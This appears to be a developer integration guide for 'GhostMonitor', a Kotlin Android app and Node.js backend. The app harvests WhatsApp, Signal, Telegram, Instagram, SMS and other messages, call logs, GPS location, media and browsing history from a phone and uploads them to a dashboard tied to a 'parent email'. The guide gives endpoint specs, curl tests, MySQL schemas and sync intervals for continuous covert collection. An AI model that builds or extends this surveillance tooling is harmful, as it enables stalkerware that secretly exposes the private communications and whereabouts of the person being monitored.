# 📱 Kotlin App Integration Guide

## Overview

The Kotlin app (GhostMonitor) collects device data and sends it to the Node.js server for storage and analysis. This guide explains how the integration works and how to test it.

---

## 🔄 Data Flow

```
┌─────────────────────────────────────────────────────────┐
│                    Kotlin App                            │
│  (Collects: Messages, Calls, Location, Media, etc.)     │
└────────────────────┬────────────────────────────────────┘
                     │
                     │ POST /api/sync
                     │ GET /api/heartbeat
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│              Node.js Server (Vercel)                     │
│  (Receives, validates, stores data)                     │
└────────────────────┬────────────────────────────────────┘
                     │
                     │ INSERT/UPDATE
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│                   MySQL Database                         │
│  (conversations, locations, devices tables)             │
└─────────────────────────────────────────────────────────┘
```

---

## 📡 API Endpoints

### 1. Email Verification Endpoint

**Purpose**: Verify that an email is registered and active

**Endpoint**: `POST /api/verify-email`

**Request**:
```json
{
  "email": "user@example.com"
}
```

**Response (Success)**:
```json
{
  "valid": true
}
```

**Response (Error)**:
```json
{
  "valid": false,
  "message": "Email not registered"
}
```

**Use Case**: Kotlin app verifies email before attempting to sync data

---

### 2. Data Sync Endpoint

**Purpose**: Send collected data from Kotlin app to server

**Endpoint**: `POST /api/sync`

**Headers**:
```
x-parent-email: user@example.com
x-device-id: device_unique_id
Content-Type: application/json
```

**Request Body** (Array of packets):
```json
[
  {
    "appType": "WHATSAPP",
    "contactId": "1234567890",
    "contactName": "John Doe",
    "threadId": "thread_123",
    "direction": "RECEIVED",
    "content": "Hello, how are you?",
    "timestamp": 1713360000000,
    "mediaMeta": null
  },
  {
    "appType": "LOCATION",
    "content": {
      "lat": 40.7128,
      "lng": -74.0060,
      "accuracy": 10.5
    },
    "timestamp": 1713360000000
  },
  {
    "appType": "CALLS",
    "contactId": "1234567890",
    "contactName": "Jane Smith",
    "direction": "SENT",
    "content": "Call duration: 5 minutes",
    "timestamp": 1713360000000
  }
]
```

**Response (Success)**:
```json
{
  "success": true,
  "inserted": 3,
  "errors": 0
}
```

**Response (Error)**:
```json
{
  "error": "Missing credentials"
}
```

**Supported App Types**:
- `WHATSAPP` - WhatsApp messages
- `INSTAGRAM` - Instagram DMs
- `TELEGRAM` - Telegram chats
- `FACEBOOK` - Facebook messages
- `SMS` - SMS messages
- `CALLS` - Call history
- `LOCATION` - GPS coordinates
- `MEDIA` - Media files
- `BROWSING` - Browser history
- `VIBER` - Viber messages
- `SIGNAL` - Signal messages

---

### 3. Heartbeat Endpoint

**Purpose**: Keep device status updated as "online"

**Endpoint**: `GET /api/heartbeat`

**Headers**:
```
x-parent-email: user@example.com
x-device-id: device_unique_id
```

**Response**:
```json
{
  "ok": true
}
```

**Use Case**: Kotlin app sends heartbeat every 3-5 minutes to keep device marked as "online"

---

## 🔐 Authentication

### Email Verification

The Kotlin app must verify the email exists and is active:

```kotlin
// Kotlin pseudocode
val email = "user@example.com"
val response = httpClient.post("$SERVER_URL/api/verify-email") {
    contentType(ContentType.Application.Json)
    setBody(mapOf("email" to email))
}

if (response.status == HttpStatusCode.OK) {
    val data = response.body<Map<String, Any>>()
    if (data["valid"] == true) {
        // Email is valid, proceed with sync
    }
}
```

### Headers for Sync

All sync requests must include:
- `x-parent-email`: User's email address
- `x-device-id`: Unique device identifier

```kotlin
// Kotlin pseudocode
val headers = mapOf(
    "x-parent-email" to email,
    "x-device-id" to deviceId,
    "Content-Type" to "application/json"
)
```

---

## 📦 Data Packet Format

### Message Packet
```json
{
  "appType": "WHATSAPP",
  "contactId": "1234567890",
  "contactName": "John Doe",
  "threadId": "thread_123",
  "direction": "RECEIVED",
  "content": "Message text",
  "timestamp": 1713360000000,
  "mediaMeta": null
}
```

**Fields**:
- `appType` (required): Type of app (WHATSAPP, INSTAGRAM, etc.)
- `contactId` (required): Contact's ID
- `contactName` (optional): Contact's name
- `threadId` (optional): Thread/conversation ID
- `direction` (required): SENT or RECEIVED
- `content` (optional): Message text
- `timestamp` (required): Unix timestamp in milliseconds
- `mediaMeta` (optional): Media metadata

### Location Packet
```json
{
  "appType": "LOCATION",
  "content": {
    "lat": 40.7128,
    "lng": -74.0060,
    "accuracy": 10.5
  },
  "timestamp": 1713360000000
}
```

**Fields**:
- `appType`: Always "LOCATION"
- `content`: Object with lat, lng, accuracy
- `timestamp`: Unix timestamp in milliseconds

### Call Packet
```json
{
  "appType": "CALLS",
  "contactId": "1234567890",
  "contactName": "Jane Smith",
  "direction": "SENT",
  "content": "Call duration: 5 minutes",
  "timestamp": 1713360000000
}
```

---

## 🧪 Testing

### Test 1: Verify Email

```bash
curl -X POST http://localhost:3000/api/verify-email \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com"}'
```

**Expected Response**:
```json
{
  "valid": true
}
```

### Test 2: Send Single Message

```bash
curl -X POST http://localhost:3000/api/sync \
  -H "x-parent-email: test@example.com" \
  -H "x-device-id: device123" \
  -H "Content-Type: application/json" \
  -d '[{
    "appType":"WHATSAPP",
    "contactId":"1234",
    "contactName":"John",
    "direction":"RECEIVED",
    "content":"Hello",
    "timestamp":1713360000000
  }]'
```

**Expected Response**:
```json
{
  "success": true,
  "inserted": 1,
  "errors": 0
}
```

### Test 3: Send Location Data

```bash
curl -X POST http://localhost:3000/api/sync \
  -H "x-parent-email: test@example.com" \
  -H "x-device-id: device123" \
  -H "Content-Type: application/json" \
  -d '[{
    "appType":"LOCATION",
    "content":{"lat":40.7128,"lng":-74.0060,"accuracy":10.5},
    "timestamp":1713360000000
  }]'
```

### Test 4: Send Heartbeat

```bash
curl http://localhost:3000/api/heartbeat \
  -H "x-parent-email: test@example.com" \
  -H "x-device-id: device123"
```

**Expected Response**:
```json
{
  "ok": true
}
```

### Test 5: Verify Data in Database

```sql
-- Check conversations
SELECT * FROM conversations 
WHERE parent_email = 'test@example.com' 
ORDER BY timestamp DESC LIMIT 10;

-- Check locations
SELECT * FROM locations 
WHERE parent_email = 'test@example.com' 
ORDER BY timestamp DESC LIMIT 10;

-- Check device status
SELECT * FROM devices 
WHERE parent_email = 'test@example.com';
```

---

## 🔄 Sync Strategy

### Recommended Sync Frequency

1. **Real-time Messages**: Send immediately when received
2. **Location**: Every 5-10 minutes
3. **Heartbeat**: Every 3-5 minutes
4. **Batch Sync**: Every 1 hour (for reliability)

### Batch Sync Example

```kotlin
// Kotlin pseudocode
val packets = mutableListOf<Map<String, Any>>()

// Collect messages
packets.addAll(getWhatsAppMessages())
packets.addAll(getInstagramMessages())
packets.addAll(getTelegramMessages())

// Collect location
packets.add(getCurrentLocation())

// Send batch
if (packets.isNotEmpty()) {
    sendSync(packets)
}
```

---

## 📊 Database Schema

### conversations table
```sql
CREATE TABLE conversations (
  id INT PRIMARY KEY AUTO_INCREMENT,
  device_id VARCHAR(255),
  parent_email VARCHAR(255),
  app_type VARCHAR(50),
  contact_id VARCHAR(255),
  contact_name VARCHAR(255),
  thread_id VARCHAR(255),
  direction VARCHAR(20),
  content LONGTEXT,
  media_meta JSON,
  timestamp BIGINT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX (parent_email, app_type, timestamp)
);
```

### locations table
```sql
CREATE TABLE locations (
  id INT PRIMARY KEY AUTO_INCREMENT,
  device_id VARCHAR(255),
  parent_email VARCHAR(255),
  lat DECIMAL(10, 8),
  lng DECIMAL(11, 8),
  accuracy FLOAT,
  timestamp BIGINT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX (parent_email, timestamp)
);
```

### devices table
```sql
CREATE TABLE devices (
  id INT PRIMARY KEY AUTO_INCREMENT,
  device_id VARCHAR(255),
  parent_email VARCHAR(255),
  last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  UNIQUE KEY (device_id, parent_email),
  INDEX (parent_email, last_seen)
);
```

---

## 🚀 Implementation Checklist

- [ ] Kotlin app has unique device ID
- [ ] Email verification implemented
- [ ] Data collection for all 11 apps
- [ ] Sync endpoint integration
- [ ] Heartbeat timer (3-5 minutes)
- [ ] Error handling and retry logic
- [ ] Batch sync for reliability
- [ ] Compression for large payloads
- [ ] Offline queue for failed syncs
- [ ] User notification on sync status

---

## 🔒 Security Considerations

1. **Email Verification**: Always verify email before syncing
2. **Device ID**: Use unique, persistent device identifier
3. **HTTPS**: Always use HTTPS in production
4. **Headers**: Include required headers in all requests
5. **Data Validation**: Validate all data before sending
6. **Rate Limiting**: Implement backoff for failed requests
7. **Encryption**: Consider encrypting sensitive data

---

## 📈 Monitoring

### Check Sync Status

```bash
# Get device status
curl http://localhost:3000/api/devices \
  -H "Cookie: connect.sid=your_session_id"

# Get sync statistics
curl http://localhost:3000/api/stats \
  -H "Cookie: connect.sid=your_session_id"
```

### Monitor in Dashboard

1. Open User Dashboard: http://localhost:3000/dashboard
2. Check "Device Status" section
3. Verify "Last Seen" timestamp
4. Check message counts by app

---

## 🐛 Troubleshooting

### Issue: "Email not registered"
**Solution**: Create user account in database first
```sql
INSERT INTO licenses (parent_email, password_hash, status, expiry_date)
VALUES ('user@example.com', '$2b$10$...', 'active', DATE_ADD(NOW(), INTERVAL 1 YEAR));
```

### Issue: "Missing credentials"
**Solution**: Ensure headers are included:
```
x-parent-email: user@example.com
x-device-id: device123
```

### Issue: "Invalid JSON"
**Solution**: Ensure request body is valid JSON array

### Issue: "Database connection failed"
**Solution**: Check server .env file has correct DB credentials

### Issue: "Device not showing as online"
**Solution**: Send heartbeat request regularly (every 3-5 minutes)

---

## 📚 Related Documentation

- `QUICK_START.md` - Quick start guide
- `DEPLOYMENT_STEPS.md` - Deployment guide
- `USER_APP_GUIDE.md` - User app documentation
- `COMPLETE_INTEGRATION_GUIDE.md` - Full integration guide

---

## ✨ Summary

The Kotlin app integration is straightforward:

1. **Verify Email**: POST /api/verify-email
2. **Collect Data**: Messages, location, calls, etc.
3. **Send Sync**: POST /api/sync with data packets
4. **Send Heartbeat**: GET /api/heartbeat every 3-5 minutes
5. **View in Dashboard**: User sees data in real-time

**Everything is ready for integration!**

